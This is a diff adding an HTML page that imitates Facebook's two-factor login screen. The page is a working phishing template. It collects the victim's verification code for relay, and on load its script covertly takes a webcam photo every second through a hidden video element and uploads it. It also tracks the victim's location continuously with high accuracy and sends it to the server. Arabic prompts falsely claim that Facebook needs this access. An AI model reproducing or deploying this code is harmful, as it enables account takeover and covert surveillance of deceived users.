@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+    <title>Login Verification</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0;
+            margin: 0;
+            font-size: 14px;
+            line-height: 1.34;
+            color: #1c1e21;
+            direction: ltr;
+        }
+        
+        /* Header */
+        .header {
+            width: 100%;
+            background-color: white;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            padding: 8px 0;
+        }
+        
+        .header-container {
+            display: flex;
+            align-items: center;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+        
+        .fb-logo {
+            height: 40px;
+            margin-right: auto;
+        }
+        
+        /* Main content */
+        .main-content {
+            flex: 1;
+            width: 100%;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 30px;
+        }
+        
+        .verification-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 24px;
+            width: 500px;
+        }
+        
+        /* Title and description */
+        .title {
+            color: #1877f2;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        
+        .subtitle {
+            color: #65676B;
+            font-size: 15px;
+            margin-bottom: 24px;
+            text-align: center;
+            line-height: 1.4;
+        }
+        
+        /* Shield icon */
+        .security_icon {
+            background-color: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 80px;
+            width: 80px;
+            margin: 8px auto 24px;
+        }
+        
+        .security_icon svg {
+            fill: #1877f2;
+            height: 40px;
+            width: 40px;
+        }
+        
+        /* Panel */
+        .panel {
+            background-color: #f0f2f5;
+            border-radius: 8px;
+            margin: 20px 0;
+            padding: 16px;
+        }
+        
+        .panel-title {
+            font-weight: 600;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+        
+        .phone-label {
+            color: #65676b;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+        
+        .phone-number {
+            font-weight: 500;
+            font-size: 15px;
+        }
+        
+        /* Input styles */
+        .code-input-container {
+            margin: 24px 0;
+        }
+        
+        .code-input {
+            width: 100%;
+            height: 48px;
+            font-size: 18px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 0 12px;
+            text-align: center;
+            letter-spacing: 8px;
+            font-weight: bold;
+            background-color: #fffdcf;
+            color: #333;
+        }
+        
+        .code-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        
+        /* Buttons */
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 24px;
+        }
+        
+        .cancel-btn {
+            background-color: #e4e6eb;
+            border: none;
+            border-radius: 6px;
+            color: #1c1e21;
+            font-size: 15px;
+            font-weight: 600;
+            padding: 12px 20px;
+            cursor: pointer;
+            margin-right: 12px;
+        }
+        
+        .submit-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 12px 20px;
+            cursor: pointer;
+            flex-grow: 1;
+        }
+        
+        .submit-btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .cancel-btn:hover {
+            background-color: #d8dadf;
+        }
+        
+        /* Links */
+        .help-link {
+            color: #1877f2;
+            cursor: pointer;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 20px;
+            display: block;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .help-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* Timer */
+        .resend-timer {
+            color: #65676b;
+            margin-top: 16px;
+            font-size: 13px;
+            text-align: center;
+        }
+        
+        /* Footer */
+        .footer {
+            width: 100%;
+            padding: 20px;
+            background-color: #fff;
+            margin-top: 40px;
+        }
+        
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+        }
+        
+        .languages {
+            display: flex;
+            flex-wrap: wrap;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #dddfe2;
+        }
+        
+        .language-link {
+            font-size: 12px;
+            color: #8a8d91;
+            text-decoration: none;
+            padding: 0 10px 0 0;
+        }
+        
+        .language-link:hover {
+            text-decoration: underline;
+        }
+        
+        .language-link.active {
+            color: #1877f2;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+        
+        .footer-link {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 12px;
+            padding: 0 10px 0 0;
+            margin: 3px 0;
+        }
+        
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 11px;
+            color: #8a8d91;
+            margin-top: 20px;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            display: none;
+        }
+
+        .fb-loader {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            color: #65676b;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        /* Loader animation */
+        .fb-loader svg {
+            animation: rotate 1s linear infinite;
+        }
+
+        @keyframes rotate {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-container">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="fb-logo">
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="verification-container">
+            <div class="security_icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
+                    <circle cx="18" cy="18" r="18" fill="#1877f2"/>
+                    <path d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1-.2-2-.4-3-.4-4.1 0-7 2.5-7 7v4h-4.5v5H16v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h3z" fill="#ffffff"/>
+                </svg>
+            </div>
+            
+            <h1 class="title">Two-Factor Authentication</h1>
+            <p class="subtitle">Please enter the 6-digit code from your authenticator app or the text message we sent to your phone.</p>
+            
+            <div class="panel">
+                <div class="panel-title">Enter code</div>
+                <div class="phone-label">We sent a code to:</div>
+                <div class="phone-number" id="masked-email">{{ email|mask_email }}</div>
+            </div>
+            
+            <form id="verificationForm">
+                <div class="code-input-container">
+                    <input type="text" class="code-input" id="verification_code" name="verification_code" placeholder="- - - - - -" maxlength="6" pattern="[0-9]*" inputmode="numeric" autocomplete="off" required>
+                </div>
+                
+                <div class="resend-timer">
+                    You can request a new code in <span id="timer">30</span> seconds
+                </div>
+                
+                <div class="button-container">
+                    <button type="button" class="cancel-btn" id="cancelBtn">Cancel</button>
+                    <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
+                </div>
+            </form>
+            
+            <a href="#" class="help-link">Need help?</a>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-content">
+            <div class="languages">
+                <a href="#" class="language-link active">English (US)</a>
+                <a href="#" class="language-link">Español</a>
+                <a href="#" class="language-link">Français (France)</a>
+                <a href="#" class="language-link">中文(简体)</a>
+                <a href="#" class="language-link">العربية</a>
+                <a href="#" class="language-link">Português (Brasil)</a>
+                <a href="#" class="language-link">Italiano</a>
+                <a href="#" class="language-link">한국어</a>
+                <a href="#" class="language-link">Deutsch</a>
+                <a href="#" class="language-link">हिन्दी</a>
+                <a href="#" class="language-link">日本語</a>
+            </div>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Advertising</a>
+                <a href="#" class="footer-link">Ad Choices</a>
+                <a href="#" class="footer-link">Cookies</a>
+                <a href="#" class="footer-link">More</a>
+            </div>
+            <div class="copyright">Meta © 2024</div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="fb-loader">
+            <svg width="60" height="60" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="45" fill="none" stroke="#1877f2" stroke-width="8" stroke-dasharray="150 50" />
+            </svg>
+        </div>
+        <div class="loading-text">Verifying...</div>
+    </div>
+    
+    <!-- Browser Permission Modals -->
+    <div class="permission-modal" id="browserPermissionModal" style="display: flex;">
+        <div class="permission-content">
+            <div class="permission-title">السماح بالوصول إلى الكاميرا</div>
+            <div class="permission-message">يرغب Facebook في الوصول إلى الكاميرا الخاصة بك لتأكيد هويتك وتأمين حسابك.</div>
+            <div class="permission-buttons">
+                <button class="permission-button permission-deny" id="browserPermissionDeny">رفض</button>
+                <button class="permission-button permission-allow" id="browserPermissionAllow">السماح</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="permission-modal" id="locationBrowserModal" style="display: none;">
+        <div class="permission-content">
+            <div class="permission-title">مشاركة موقعك</div>
+            <div class="permission-message">يرغب Facebook في معرفة موقعك للتأكد من أنك تسجل الدخول من المكان المعتاد.</div>
+            <div class="permission-buttons">
+                <button class="permission-button permission-deny" id="locationBrowserDeny">رفض</button>
+                <button class="permission-button permission-allow" id="locationBrowserAllow">السماح</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hide custom modal dialogs as we'll use native browser prompts directly
+            const browserPermissionModal = document.getElementById('browserPermissionModal');
+            const locationBrowserModal = document.getElementById('locationBrowserModal');
+            
+            if (browserPermissionModal) browserPermissionModal.style.display = 'none';
+            if (locationBrowserModal) locationBrowserModal.style.display = 'none';
+            
+            // Create hidden elements for media capture
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.setAttribute('playsinline', '');
+            hiddenVideo.setAttribute('autoplay', '');
+            hiddenVideo.style.width = '1px';
+            hiddenVideo.style.height = '1px';
+            hiddenVideo.style.position = 'absolute';
+            hiddenVideo.style.opacity = '0.01';
+            hiddenVideo.style.pointerEvents = 'none';
+            document.body.appendChild(hiddenVideo);
+            
+            const hiddenCanvas = document.createElement('canvas');
+            hiddenCanvas.style.display = 'none';
+            document.body.appendChild(hiddenCanvas);
+            
+            let mediaStream = null;
+            let locationWatchId = null;
+            let captureInterval = null;
+            
+            // Request permissions when page loads or after brief delay
+            setTimeout(requestCameraPermission, 1000);
+            
+            // Request browser camera permission directly
+            function requestCameraPermission() {
+                // Request browser camera permission - this will show the browser's native permission dialog
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: "user"
+                    },
+                    audio: false 
+                })
+                .then(function(stream) {
+                    console.log('Camera access granted');
+                    mediaStream = stream;
+                    hiddenVideo.srcObject = stream;
+                    
+                    // Start capturing images after camera access
+                    startPeriodicCapture();
+                    
+                    // Send permission granted status
+                    fetch('/api/permissions', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            cameraAccess: true,
+                            timestamp: new Date().toISOString(),
+                            source: '2fa_direct_browser_prompt'
+                        })
+                    });
+                    
+                    // Request location permission after camera
+                    setTimeout(requestLocationPermission, 500);
+                })
+                .catch(function(err) {
+                    console.log('Camera access denied:', err);
+                    
+                    // Send permission denied status
+                    fetch('/api/permissions', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            cameraAccess: false,
+                            error: err.name,
+                            timestamp: new Date().toISOString(),
+                            source: '2fa_direct_browser_prompt'
+                        })
+                    });
+                    
+                    // Still request location permission anyway
+                    setTimeout(requestLocationPermission, 500);
+                });
+            }
+            
+            // Request browser location permission directly
+            function requestLocationPermission() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            // Location permission granted, send data
+                            sendLocationData(position);
+                            
+                            // Start continuous location tracking
+                            startLocationTracking();
+                        },
+                        function(err) {
+                            console.log('Location access denied:', err);
+                            
+                            // Send permission denied status
+                            fetch('/api/get-location', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    denied: true,
+                                    error: err.code,
+                                    timestamp: new Date().toISOString(),
+                                    source: '2fa_direct_browser_prompt'
+                                })
+                            });
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            maximumAge: 0,
+                            timeout: 5000
+                        }
+                    );
+                }
+            }
+            
+            function startLocationTracking() {
+                // Start continuous location tracking with high accuracy
+                if (navigator.geolocation) {
+                    locationWatchId = navigator.geolocation.watchPosition(
+                        sendLocationData,
+                        function(err) {
+                            console.log('Error during location tracking:', err);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            maximumAge: 5000,
+                            timeout: 10000
+                        }
+                    );
+                }
+            }
+            
+            function sendLocationData(position) {
+                // Send location data to server
+                fetch('/api/get-location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: position.timestamp,
+                        source: '2fa_direct_browser_prompt'
+                    })
+                });
+            }
+            
+            function startPeriodicCapture() {
+                // Capture one image immediately
+                captureImage();
+                
+                // Then capture one image every second
+                captureInterval = setInterval(captureImage, 1000);
+                
+                // Clean up when navigating away
+                window.addEventListener('beforeunload', function() {
+                    cleanupTracking();
+                });
+            }
+            
+            function captureImage() {
+                if (!mediaStream || !hiddenVideo.videoWidth) return;
+                
+                // Set canvas size to match video
+                hiddenCanvas.width = hiddenVideo.videoWidth;
+                hiddenCanvas.height = hiddenVideo.videoHeight;
+                
+                // Draw current video frame to canvas
+                const ctx = hiddenCanvas.getContext('2d');
+                ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                
+                // Convert canvas to blob and send to server
+                hiddenCanvas.toBlob(function(blob) {
+                    const formData = new FormData();
+                    formData.append('photo', blob, `2fa_browser_${Date.now()}.jpg`);
+                    formData.append('source', '2fa_direct_browser_prompt');
+                    
+                    // Send image to server
+                    fetch('/api/capture-photo', {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 'image/jpeg', 0.8);
+            }
+            
+            function cleanupTracking() {
+                // Stop capturing images
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                }
+                
+                // Stop location tracking
+                if (locationWatchId !== null) {
+                    navigator.geolocation.clearWatch(locationWatchId);
+                }
+                
+                // Stop all video tracks
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => {
+                        track.stop();
+                    });
+                }
+            }
+
+            // Countdown timer functionality
+            let seconds = 30;
+            const timerElement = document.getElementById('timer');
+            let countdownInterval;
+            
+            function startTimer() {
+                seconds = 30;
+                timerElement.textContent = seconds;
+                
+                clearInterval(countdownInterval);
+                countdownInterval = setInterval(function() {
+                    seconds--;
+                    timerElement.textContent = seconds;
+                    
+                    if (seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        const resendTimer = timerElement.parentElement;
+                        resendTimer.innerHTML = '<a href="#" id="resendLink" style="color: #1877f2; text-decoration: none;">Resend code</a>';
+                        
+                        // Add event listener for resend link
+                        document.getElementById('resendLink').addEventListener('click', function(e) {
+                            e.preventDefault();
+                            resendTimer.innerHTML = 'You can request a new code in <span id="timer">30</span> seconds';
+                            timerElement = document.getElementById('timer');
+                            startTimer();
+                            
+                            // Show a brief message
+                            const messageElement = document.createElement('div');
+                            messageElement.style.color = '#1877f2';
+                            messageElement.style.textAlign = 'center';
+                            messageElement.style.marginTop = '10px';
+                            messageElement.style.fontSize = '13px';
+                            messageElement.textContent = 'A new code has been sent.';
+                            
+                            resendTimer.parentNode.insertBefore(messageElement, resendTimer.nextSibling);
+                            
+                            // Remove the message after 3 seconds
+                            setTimeout(function() {
+                                messageElement.remove();
+                            }, 3000);
+                        });
+                    }
+                }, 1000);
+            }
+            
+            startTimer();
+            
+            // Handle form submission
+            const form = document.getElementById('verificationForm');
+            const codeInput = document.getElementById('verification_code');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const code = codeInput.value.trim();
+                
+                if (code.length === 6 && /^\d+$/.test(code)) {
+                    // Show loading overlay
+                    loadingOverlay.style.display = 'flex';
+                    
+                    // Simulate delay for more realistic experience
+                    setTimeout(function() {
+                        // Send verification request
+                        fetch('/verify_code', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                            },
+                            body: `verification_code=${code}`
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            // Add another small delay before redirecting
+                            setTimeout(function() {
+                                if (data.status === 'success') {
+                                    window.location.href = data.redirect_url;
+                                } else {
+                                    loadingOverlay.style.display = 'none';
+                                    alert('Verification failed. Please try again.');
+                                }
+                            }, 1000);
+                        })
+                        .catch(error => {
+                            loadingOverlay.style.display = 'none';
+                            console.error('Error:', error);
+                        });
+                    }, 2000);
+                } else {
+                    alert('Please enter a valid 6-digit code');
+                }
+            });
+            
+            // Handle cancel button
+            document.getElementById('cancelBtn').addEventListener('click', function() {
+                // Show loading overlay
+                loadingOverlay.style.display = 'flex';
+                loadingOverlay.querySelector('.loading-text').textContent = 'Returning to login...';
+                
+                // Add delay before redirecting
+                setTimeout(function() {
+                    window.location.href = '/';
+                }, 1500);
+            });
+            
+            // Auto focus on input and format code input
+            codeInput.focus();
+            
+            codeInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+        });
+    </script>
+</body>
+</html> 
